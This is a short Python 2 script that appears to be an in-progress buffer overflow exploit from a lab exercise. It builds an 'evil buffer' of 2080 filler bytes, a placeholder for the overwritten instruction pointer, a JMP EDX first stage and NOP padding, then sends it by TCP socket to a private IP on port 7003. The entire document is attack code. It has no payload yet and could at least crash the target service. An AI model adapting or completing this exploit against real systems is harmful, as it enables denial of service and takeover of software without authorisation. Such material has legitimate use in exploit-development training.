#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "Y" * 4
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(filler) - len(eip) - len(first_stage))
  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
